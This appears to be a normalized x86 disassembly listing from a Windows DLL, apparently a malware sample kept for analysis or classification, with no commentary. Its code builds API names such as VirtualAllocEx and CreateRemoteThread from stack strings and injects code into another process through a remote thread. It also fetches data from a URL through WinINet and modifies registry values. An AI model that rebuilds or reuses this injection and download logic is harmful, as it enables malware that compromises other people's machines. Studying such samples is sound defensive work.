mov [ ebp - 0x1c ] 0x3
call esi
test eax eax
jne r-xdata
push r--data
push [ ebp - 0x14 ]
call [ RegDeleteValueA@IAT ]
mov esi [ wcslen@IAT ]
lea eax [ ebp - 0x63c ]
push eax
call esi
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
lea eax [ ebp - 0x63c ]
push eax
push 0x2
push ebx
push r--data
push [ ebp - 0x14 ]
call [ RegSetValueExW@IAT ]
test eax eax
jne r-xdata
mov ecx r--data
call sub_10004c18
lea eax [ ebp - 0x43c ]
push eax
mov [ ebp - 0x34 ] eax
call esi
add eax eax
mov [ ebp - 0x36 ] ax
mov [ ebp - 0x38 ] ax
pop ecx
lea eax [ ebp - 0x38 ]
push eax
call [ ebp - 0x28 ]
lea eax [ ebp - 0x38 ]
push eax
call [ ebp - 0x24 ]
cmp eax ebx
jl r-xdata
mov [ ebp - 0x30 ] 0x1
sub_1000d494
push ebp
mov ebp esp
sub esp 0x24
push ebx
push edi
xor edi edi
push r--data
mov [ ebp - 0x10 ] edi
call [ LoadLibraryA@IAT ]
mov ebx eax
mov [ ebp - 0x8 ] ebx
cmp ebx edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push ebx
call esi
mov [ ebp - 0x14 ] eax
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push ebx
jmp r-xdata
push r--data
push ebx
call esi
mov [ ebp - 0x18 ] eax
cmp eax edi
je r-xdata
pop edi
pop ebx
leave
retn
call [ FreeLibrary@IAT ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x24 ]
push eax
push edi
push edi
push edi
push edi
mov [ ebp - 0x24 ] 0xc
call [ ebp - 0x14 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0xc ] edi
mov edi [ strlen@IAT ]
mov esi r--data
push esi
call edi
add eax 0x10
push eax
call [ malloc@IAT ]
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
pop esi
push [ ebp - 0x8 ]
push esi
push r--data
push ebx
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
call edi
pop ecx
push eax
push esi
push ebx
call edi
pop ecx
push eax
push ebx
call [ ebp - 0x18 ]
push ebx
test eax eax
jne r-xdata
call [ free@IAT ]
mov eax 0x400
pop ecx
cmp [ ebp - 0xc ] eax
jbe r-xdata
call [ free@IAT ]
pop ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
call [ FreeLibrary@IAT ]
push 0x6f
call [ SetLastError@IAT ]
push [ ebp - 0x8 ]
call [ FreeLibrary@IAT ]
mov eax [ ebp - 0x10 ]
mov esi [ ebp + 0x10 ]
push eax
push [ ebp - 0x4 ]
push esi
call [ strncpy@IAT ]
add esp 0xc
push [ ebp - 0x4 ]
mov [ esi + 0x3ff ] 0x0
call [ GlobalFree@IAT ]
mov [ ebp - 0x10 ] 0x1
sub_1000d5cf
push ebp
mov ebp esp
sub esp 0x464
push ebx
xor ebx ebx
push r--data
mov [ ebp - 0x14 ] ebx
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x10 ] eax
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x14 ]
pop ebx
leave
retn
push esi
push edi
push ebx
push 0x41
push 0x4f70656e
push 0x726e6574
mov edi 0x496e7465
lea eax [ ebp - 0x64 ]
push edi
push eax
call sub_1000c4ad
mov esi [ GetProcAddress@IAT ]
add esp 0x18
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x10 ]
call esi
push ebx
push 0x55726c41
push 0x4f70656e
push 0x726e6574
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x64 ]
push edi
push eax
call sub_1000c4ad
add esp 0x18
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x10 ]
call esi
push r--data
push [ ebp - 0x10 ]
mov edi eax
call esi
push r--data
push [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
call esi
push r--data
push [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
call esi
mov [ ebp - 0x20 ] eax
cmp edi ebx
je r-xdata
push [ ebp - 0x10 ]
call [ FreeLibrary@IAT ]
pop edi
pop esi
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push r--data
call [ ebp - 0x8 ]
mov esi eax
mov [ ebp - 0x24 ] esi
cmp esi ebx
je r-xdata
push 0x8
push r--data
push [ ebp + 0x8 ]
call [ _strnicmp@IAT ]
add esp 0xc
push ebx
test eax eax
jne r-xdata
push 0x80000300
push 0x80800300
jmp r-xdata
push [ ebp - 0x24 ]
call [ ebp - 0x20 ]
push 0x20
pop esi
push ebx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push 0x13
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] esi
call [ ebp - 0x1c ]
test eax eax
je r-xdata
push ebx
push ebx
push [ ebp + 0x8 ]
push esi
call edi
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov edi [ atol@IAT ]
mov [ ebp + eax - 0x44 ] bl
lea eax [ ebp - 0x44 ]
push eax
call edi
pop ecx
cmp eax 0xc8
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push 0x5
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] esi
call [ ebp - 0x1c ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov [ edi ] ebx
mov [ esi ] ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp + eax - 0x44 ] bl
lea eax [ ebp - 0x44 ]
push eax
call edi
pop ecx
mov [ ebp - 0x4 ] eax
mov [ edi ] ebx
mov [ esi ] ebx
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
mov eax 0x400
push eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x464 ]
push eax
push [ ebp - 0xc ]
call [ ebp - 0x18 ]
test eax eax
jne r-xdata
mov [ edi ] ebx
mov [ esi ] ebx
jmp r-xdata
push [ ebp - 0x4 ]
call [ malloc@IAT ]
pop ecx
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov [ esi ] ecx
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
push esi
push ecx
push eax
push [ ebp - 0xc ]
call [ ebp - 0x18 ]
test eax eax
jne r-xdata
mov eax [ esi ]
add eax [ ebp - 0x4 ]
push eax
push [ edi ]
call [ realloc@IAT ]
pop ecx
pop ecx
mov [ edi ] eax
cmp eax ebx
je r-xdata
push [ edi ]
call [ free@IAT ]
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
lea ecx [ ebp - 0x464 ]
push ecx
mov ecx [ esi ]
add ecx eax
push ecx
call [ memcpy@IAT ]
mov eax [ ebp - 0x4 ]
add esp 0xc
add [ esi ] eax
sub_1000d82c
push ebp
mov ebp esp
mov eax 0x18690
call sub_1000faf0
push ebx
push esi
xor ebx ebx
push edi
push ebx
push ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0xc ] ebx
call [ CoInitializeEx@IAT ]
push r--data
mov [ ebp - 0x48c ] bl
mov [ ebp - 0x28c ] bl
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ ebp - 0x8 ] esi
cmp esi ebx
je r-xdata
call [ CoUninitialize@IAT ]
jmp r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
cmp eax ebx
jne r-xdata
mov eax [ ebp - 0x24 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x14
pop ecx
mov [ ebp - 0x18 ] ecx
push 0x4
mov [ ebp - 0x44 ] ecx
pop edx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x34 ] ecx
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x44 ]
push ecx
xor edi edi
push 0x4b
inc edi
push ebx
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x7c ] 0x2
mov [ ebp - 0x70 ] edx
mov [ ebp - 0x64 ] 0x9
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x38 ] ebx
call eax
test eax eax
je r-xdata
push esi
call [ FreeLibrary@IAT ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x14 ] eax
mov esi 0x200
test al 0x2
je r-xdata
test [ ebp - 0x14 ] 0x4
je r-xdata
push esi
push [ ebp - 0x78 ]
lea eax [ ebp - 0x48c ]
push eax
call [ strncpy@IAT ]
add esp 0xc
mov [ ebp - 0x28d ] bl
mov esi [ GlobalFree@IAT ]
cmp [ ebp - 0x78 ] ebx
je r-xdata
push esi
push [ ebp - 0x6c ]
lea eax [ ebp - 0x28c ]
push eax
call [ strncpy@IAT ]
add esp 0xc
mov [ ebp - 0x8d ] bl
cmp [ ebp - 0x6c ] ebx
je r-xdata
push [ ebp - 0x78 ]
call esi
cmp [ ebp - 0x60 ] ebx
je r-xdata
push [ ebp - 0x6c ]
call esi
push [ ebp - 0x8 ]
call [ FreeLibrary@IAT ]
cmp [ ebp - 0x48c ] bl
je r-xdata
push [ ebp - 0x6c ]
call esi
cmp [ ebp - 0x28c ] bl
je r-xdata
push 0x40
lea eax [ ebp - 0x48c ]
push eax
lea eax [ ebp - 0x288c ]
push eax
call [ strncpy@IAT ]
add esp 0xc
mov [ ebp - 0x284d ] bl
mov [ ebp - 0xc ] edi
call [ CoUninitialize@IAT ]
cmp [ ebp - 0xc ] ebx
je r-xdata
mov esi [ _strnicmp@IAT ]
push 0x4
lea eax [ ebp - 0x28c ]
push r--data
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
call esi
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
jbe r-xdata
push 0x7
lea eax [ ebp - 0x28c ]
push r--data
push eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
call esi
add esp 0xc
push ecx
push ecx
mov [ ebp - 0x18 ] esp
mov edi esp
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28c ]
push eax
call sub_1000d5cf
add esp 0xc
mov esi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov [ ebp - 0x24 ] esi
call sub_1000c554
fcomp [ r--data ]
fnstsw ax
test ah 0x1
jne r-xdata
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x28c ]
call sub_1000bfe8
lea esi [ ebp - 0x20 ]
call sub_1000c108
lea eax [ ebp - 0x285 ]
call sub_1000bfe8
lea esi [ ebp - 0x20 ]
call sub_1000c108
mov edi [ ebp - 0x20 ]
cmp edi ebx
jne r-xdata
cmp esi ebx
je r-xdata
push ebx
push ebx
call [ CoInitializeEx@IAT ]
push 0x4a000
call [ malloc@IAT ]
pop ecx
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x1868c ]
call sub_1000bd27
jmp r-xdata
mov eax [ ebp - 0x8 ]
lea eax [ ebp + eax - 0x288c ]
push 0x3a
push eax
call [ strchr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push eax
lea edi [ ebp - 0x8 ]
call sub_10004d70
pop ecx
mov esi eax
pop ecx
lea eax [ ebp - 0x20 ]
call sub_1000c057
mov eax r--data
xor esi esi
mov edi r--data
mov eax [ ebp - 0x10 ]
inc eax
push eax
call sub_10004aa8
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
cmp esi ebx
je r-xdata
call [ CoUninitialize@IAT ]
mov [ ebp - 0xc ] ebx
mov edx eax
lea ecx [ ebp - 0x1868c ]
call sub_1000b7e1
mov [ ebp - 0xc ] eax
jmp r-xdata
inc [ ebp - 0x14 ]
mov eax [ ebp - 0x14 ]
add [ ebp - 0x8 ] 0x40
cmp eax [ ebp - 0xc ]
jb r-xdata
mov edi 0xc4
push edi
push ebx
push esi
call [ memset@IAT ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
sub eax ecx
lea edx [ ebp - 0x288c ]
sub eax edx
add esp 0xc
cmp eax 0x40
jb r-xdata
push eax
call [ wcslen@IAT ]
pop ecx
cmp esi eax
jae r-xdata
mov eax r--data
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push esi
call [ memcpy@IAT ]
add esp 0xc
push [ ebp - 0x8 ]
call [ free@IAT ]
inc [ ebp - 0x10 ]
pop ecx
lea eax [ ebp - 0x88c ]
push eax
push [ ebp - 0x10 ]
push esi
call sub_1000d494
add esp 0xc
test eax eax
je r-xdata
cmp esi ebx
jle r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
cmp [ ebp - 0x10 ] 0x20
jae r-xdata
push eax
lea eax [ ebp + ecx - 0x288c ]
push eax
push esi
call [ strncpy@IAT ]
mov eax [ ebp - 0x18 ]
add esp 0xc
inc eax
push eax
mov [ esi + 0x3f ] bl
call [ atol@IAT ]
inc [ ebp - 0x10 ]
mov [ esi + 0x40 ] eax
pop ecx
add esi edi
push 0x40
pop eax
mov eax [ ebp - 0x20 ]
cmp eax ebx
jne r-xdata
cmp [ edi + esi * 2 ] 0x2f
jne r-xdata
push [ ebp - 0x18 ]
call sub_10004ad0
pop ecx
lea eax [ ebp - 0x88c ]
lea edi [ ebp - 0x20 ]
call sub_1000bfe8
lea ecx [ ebp - 0x30 ]
push ecx
call sub_1000c2e2
mov eax edi
call sub_1000c057
cmp [ ebp - 0xc ] 0x80
mov [ ebp - 0x8 ] ebx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
inc esi
jmp r-xdata
push 0x5c
pop eax
mov [ edi + esi * 2 ] ax
lea eax [ ebp - 0x30 ]
call sub_1000c057
mov eax [ ebp - 0xc ]
shl eax 0x6
lea eax [ ebp + eax - 0x284d ]
mov [ ebp - 0x14 ] eax
add edi 0xc4
dec [ ebp - 0x18 ]
jne r-xdata
lea eax [ ebp - 0x1860c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x20 ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x20 ]
call sub_1000c057
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
call sub_1000c2e2
lea eax [ ebp - 0x4c ]
call sub_1000c057
push 0x6
push r--data
lea eax [ ebp - 0x20 ]
call sub_1000c079
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push [ edi + 0x40 ]
lea eax [ ebp - 0x48c ]
push edi
push r--data
push 0x100
push eax
call [ _snwprintf@IAT ]
xor eax eax
add esp 0x14
xor esi esi
mov [ ebp - 0x28e ] ax
cmp [ ebp - 0xc ] ebx
jbe r-xdata
push ebx
imul esi esi 0x380
push ebx
push 0x40
lea eax [ edi + 0x44 ]
push eax
push 0xffffffff
lea eax [ ebp + esi - 0x1840c ]
push eax
push ebx
push 0x1
call [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push 0x40
lea eax [ edi + 0x84 ]
push eax
push 0xffffffff
lea eax [ ebp + esi - 0x1838c ]
push eax
push ebx
push 0x1
call [ WideCharToMultiByte@IAT ]
add [ ebp - 0x14 ] 0x380
inc esi
cmp esi [ ebp - 0xc ]
jb r-xdata
lea eax [ ebp - 0x20 ]
call sub_1000c057
inc [ ebp - 0x8 ]
cmp [ ebp - 0xc ] 0x80
jb r-xdata
lea eax [ ebp - 0x20 ]
call sub_1000c079
push ecx
push ecx
add eax 0x6
mov edi esp
mov [ ebp - 0x28 ] esp
call sub_1000bfe8
lea esi [ ebp - 0x20 ]
call sub_1000c108
push ecx
push ecx
mov eax esp
mov [ ebp - 0x28 ] esp
push eax
mov eax esi
call sub_1000c2e2
call sub_1000c108
push 0x40
mov eax esi
call sub_1000c079
mov esi [ ebp - 0x14 ]
push eax
lea eax [ esi - 0x3f ]
push eax
call [ strncpy@IAT ]
add esp 0xc
inc [ ebp - 0xc ]
mov [ esi ] bl
add esi 0x40
mov [ ebp - 0x14 ] esi
lea eax [ ebp - 0x48c ]
push eax
call [ wcslen@IAT ]
pop ecx
push eax
push [ ebp - 0x14 ]
lea eax [ ebp - 0x48c ]
push eax
call [ _wcsnicmp@IAT ]
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
call sub_1000c30b
test eax eax
je r-xdata
jmp r-xdata
sub_1000ddbe
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
push ebx
push esi
push edi
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x1c ]
push eax
xor ebx ebx
mov [ esp + 0x1c ] 0x40
call [ GetUserNameA@IAT ]
call sub_10004af3
mov edi [ _stricmp@IAT ]
and eax 0xffff0000
mov esi r--data
cmp eax 0x6000000
push esi
lea eax [ esp + 0x1c ]
push eax
jb r-xdata
call edi
pop ecx
pop ecx
test eax eax
jne r-xdata
call edi
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_1000d82c
pop ecx
mov ebx eax
lea eax [ esp + 0x18 ]
push esi
push eax
call edi
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_1000ca2f
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_1000c62e
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push [ esp + 0xc ]
push [ esp + 0x14 ]
call sub_1000c905
pop ecx
pop ecx
pop ecx
pop ecx
test eax eax
je r-xdata
sub_1000de6d
mov eax sub_1000e205
cmp cl 0xe9
jne r-xdata
movzx ecx [ eax + 0x1 ]
lea eax [ eax + ecx + 0x2 ]
jmp r-xdata
cmp [ eax ] 0xff
jne r-xdata
mov ecx [ eax + 0x1 ]
lea eax [ eax + ecx + 0x5 ]
mov cl [ eax ]
cmp cl 0xeb
jne r-xdata
retn
cmp [ eax + 0x1 ] 0x25
jne r-xdata
mov eax [ eax + 0x2 ]
mov eax [ eax ]
jmp r-xdata
sub_1000dea2
push ebp
mov ebp esp
push ecx
xor eax eax
cmp edi eax
je r-xdata
leave
retn
cmp [ ebp + 0x8 ] eax
je r-xdata
mov ecx [ edi + 0x3c ]
push ebx
push esi
mov esi [ ecx + edi + 0x78 ]
add esi edi
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x18 ] eax
jbe r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov eax [ esi + 0x20 ]
push [ ebp + 0x8 ]
lea eax [ eax + ebx * 4 ]
mov eax [ eax + edi ]
add eax edi
push eax
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x1c ]
lea eax [ eax + ebx * 2 ]
movsx eax [ eax + edi ]
lea eax [ ecx + eax * 4 ]
mov eax [ eax + edi ]
add eax edi
mov [ ebp - 0x4 ] eax
inc ebx
cmp ebx [ esi + 0x18 ]
jb r-xdata
jmp r-xdata
sub_1000df08
mov eax sub_1000fd01
call sub_1000fbf4
sub esp 0x2c
push esi
push edi
xor edi edi
cmp ebx edi
jne r-xdata
push 0x0
push 0x4578
push 0x6c6c6f63
push 0x75616c41
lea eax [ ebp - 0x38 ]
push 0x56697274
push eax
call sub_1000c4ad
add esp 0x18
lea eax [ ebp - 0x38 ]
push eax
lea esi [ ebp - 0x18 ]
call sub_1000e456
push 0x40
push 0x3000
push [ ebp + 0xc ]
lea eax [ edi + ebx ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
call [ ebp - 0x14 ]
mov esi eax
test esi esi
jne r-xdata
push edi
push 0x4578
push 0x6c6c6f63
push 0x75616c41
lea eax [ ebp - 0x38 ]
push 0x56697274
push eax
call sub_1000c4ad
add esp 0x18
lea eax [ ebp - 0x38 ]
push eax
lea esi [ ebp - 0x18 ]
call sub_1000e456
push 0x40
push 0x3000
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
push edi
push [ ebp + 0x8 ]
call [ ebp - 0x14 ]
cmp [ ebp - 0x18 ] edi
mov esi eax
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] eax
je r-xdata
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn
push [ ebp - 0x18 ]
call [ FreeLibrary@IAT ]
add edi 0x1000
cmp edi 0x6400000
jl r-xdata
push [ ebp - 0x18 ]
call [ FreeLibrary@IAT ]
jmp r-xdata
sub_1000dff5
mov eax sub_1000fd25
call sub_1000fbf4
sub esp 0x10
and [ ebp - 0x18 ] 0x0
push ebx
push esi
push r--data
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
and [ ebp - 0x4 ] 0x0
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ ebp - 0x18 ]
mov ebx eax
test esi esi
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
and [ ebp - 0x10 ] 0x0
push 0x4
mov [ ebp - 0x14 ] eax
xor eax eax
pop ecx
mov ecx [ ebp - 0xc ]
pop esi
mov eax ebx
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push esi
call [ FreeLibrary@IAT ]
mov dl [ ebp + eax - 0x11 ]
mov [ ebp + eax - 0xd ] dl
dec eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
sub_1000e078
mov eax sub_1000fce7
call sub_1000fbf4
sub esp 0x38
push ebx
push esi
push edi
xor ebx ebx
push ebx
push 0x6164
push 0x54687265
push 0x6d6f7465
push 0x74655265
lea eax [ ebp - 0x40 ]
push 0x43726561
push eax
mov [ ebp - 0x18 ] ebx
call sub_1000c4ad
add esp 0x1c
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
call [ GetCurrentProcessId@IAT ]
mov edi [ ProcessIdToSessionId@IAT ]
push eax
call edi
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
call [ GetProcessId@IAT ]
push eax
call edi
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x20 ]
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea esi [ ebp - 0x28 ]
call sub_1000e456
push [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x1
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
push ebx
push [ ebp + 0x8 ]
call [ ebp - 0x24 ]
mov [ ebp - 0x18 ] eax
xor edi edi
call sub_10004af3
mov esi 0xffff0000
and eax esi
cmp eax 0x6000000
ja r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push [ ebp - 0x28 ]
call [ FreeLibrary@IAT ]
call sub_10004af3
and eax esi
cmp eax 0x6010000
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
push 0x32
call [ SetLastError@IAT ]
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
inc edi
inc esi
cmp edi 0x300
jl r-xdata
push 0x1
push [ esi + 0x2 ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
push 0x7f
call [ SetLastError@IAT ]
jmp r-xdata
lea eax [ ebp - 0x40 ]
push eax
lea esi [ ebp - 0x28 ]
call sub_1000e456
push [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
push ebx
push [ ebp + 0x10 ]
mov [ ebp - 0x11 ] al
push [ ebp + 0xc ]
mov [ edi ] 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call [ ebp - 0x24 ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x11 ]
mov [ edi ] al
jmp r-xdata
call eax
cmp eax ebx
je r-xdata
mov eax 0x1d38
cmp [ esi ] ax
jne r-xdata
mov edi [ esi + 0x2 ]
jmp r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
lea edi [ eax + 0x30 ]
jmp r-xdata
cmp edi ebx
je r-xdata
sub_1000e205
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push edi
mov edi [ esi + 0x4 ]
lea ecx [ esi + 0x50 ]
push ecx
call eax
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
retn
lea ecx [ esi + 0x8 ]
push ecx
push eax
call edi
test eax eax
je r-xdata
cmp [ esi + 0x48 ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
jmp eax
push [ esi + 0x4c ]
call eax
sub_1000e23b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
push esi
push edi
push [ ebp + 0xc ]
call [ wcslen@IAT ]
pop ecx
add eax 0x51
push eax
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor eax eax
mov ebx [ GetModuleHandleA@IAT ]
push r--data
push r--data
call ebx
mov edi eax
call sub_1000dea2
mov [ esp ] r--data
push r--data
mov [ esi ] eax
call ebx
mov edi eax
call sub_1000dea2
pop ecx
xor ebx ebx
push ebx
push ebx
push [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
call [ wcslen@IAT ]
pop ecx
inc eax
push eax
lea eax [ esi + 0x50 ]
push eax
push 0xffffffff
push [ ebp + 0xc ]
xor edi edi
push ebx
inc edi
push edi
call [ WideCharToMultiByte@IAT ]
lea eax [ esi + 0x8 ]
push r--data
push eax
call [ strcpy@IAT ]
pop ecx
pop ecx
push 0x1000
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] ebx
call sub_1000de6d
push [ ebp + 0x8 ]
mov ebx eax
call sub_1000df08
push [ ebp + 0xc ]
mov edi [ wcslen@IAT ]
mov [ esp + 0x1c ] eax
call edi
add esp 0xc
add eax 0x51
push eax
push [ ebp + 0x8 ]
mov ebx esi
call sub_1000df08
pop ecx
pop ecx
xor ecx ecx
mov [ esp + 0x14 ] eax
mov ebx 0x8000
cmp eax ecx
je r-xdata
cmp [ esp + 0x10 ] ecx
je r-xdata
cmp [ esp + 0x10 ] ecx
je r-xdata
push esi
call sub_10004ad0
pop ecx
push ebx
push ecx
push [ esp + 0x18 ]
push [ ebp + 0x8 ]
call [ VirtualFreeEx@IAT ]
xor ecx ecx
cmp [ esp + 0x14 ] ecx
je r-xdata
push [ ebp + 0xc ]
call edi
pop ecx
add eax 0x51
push eax
push esi
push [ esp + 0x1c ]
push [ ebp + 0x8 ]
call sub_1000dff5
mov edi [ VirtualFreeEx@IAT ]
add esp 0x10
test eax eax
jne r-xdata
push ebx
push ecx
push [ esp + 0x1c ]
push [ ebp + 0x8 ]
call [ VirtualFreeEx@IAT ]
push 0x1000
call sub_1000de6d
push eax
push [ esp + 0x18 ]
push [ ebp + 0x8 ]
call sub_1000dff5
add esp 0x10
test eax eax
jne r-xdata
push ebx
push 0x0
push [ esp + 0x1c ]
push [ ebp + 0x8 ]
call edi
and [ esp + 0x14 ] 0x0
xor eax eax
push ebx
push eax
push [ esp + 0x18 ]
push [ ebp + 0x8 ]
call edi
xor eax eax
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp [ esp + 0x10 ] eax
je r-xdata
cmp [ esp + 0x10 ] eax
je r-xdata
cmp [ esp + 0x14 ] eax
je r-xdata
push ebx
push eax
push [ esp + 0x18 ]
push [ ebp + 0x8 ]
call edi
xor eax eax
cmp [ esp + 0x14 ] eax
je r-xdata
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ ebp + 0x8 ]
call sub_1000e078
add esp 0x10
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
push ebx
push eax
push [ esp + 0x1c ]
push [ ebp + 0x8 ]
call edi
jmp r-xdata
push ebx
push 0x0
push [ esp + 0x1c ]
push [ ebp + 0x8 ]
call edi
push ebx
push 0x0
push [ esp + 0x18 ]
push [ ebp + 0x8 ]
call edi
push esi
call sub_10004ad0
xor eax eax
pop ecx
inc eax
jmp r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
push [ esp + 0x18 ]
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1000e456
